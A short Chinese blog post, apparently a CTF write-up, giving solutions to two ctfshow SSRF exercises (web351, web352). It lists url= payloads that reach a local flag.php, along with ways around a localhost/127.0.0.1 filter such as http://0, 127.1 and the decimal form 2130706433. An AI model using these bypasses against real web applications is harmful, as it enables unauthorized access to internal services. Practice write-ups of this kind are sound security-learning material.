---
title: SSRF刷题
date: 2025-01-02 13:10:52
tags:
    - "web"
    - "刷题"
    - ctfshow_ssrf
categories:
    - Yohane-Mashiro
cover: https://avatars.githubusercontent.com/u/78677516?v=4
---

### web351
```
url=http://127.0.0.1/flag.php
url=http://localhost/flag.php
```

### web352

这里过滤了localhost和127.0.0.1
```
url=http://0/flag.php #在Linux中，0也会被解析成127.0.0.1
url=http://127.255.255.254/flag.php 
url=http://127.1/flag.php #127.1会被解析成127.0.0.1，也就意味着为零可缺省
url=http://2130706433/flag.php
```
